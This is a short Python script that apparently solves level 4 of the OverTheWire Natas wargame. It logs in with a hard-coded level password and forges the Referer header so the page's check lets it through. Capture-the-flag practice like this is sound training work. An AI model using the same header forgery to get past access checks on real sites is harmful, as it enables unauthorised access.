import requests
from requests.auth import HTTPBasicAuth

session = requests.Session()

url = "http://natas4.natas.labs.overthewire.org/"

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

headers = {
	"referer" : "http://natas5.natas.labs.overthewire.org/"
}

r = session.get(url, auth=HTTPBasicAuth(username, password), headers=headers)

print(r.text)

print(r.headers)
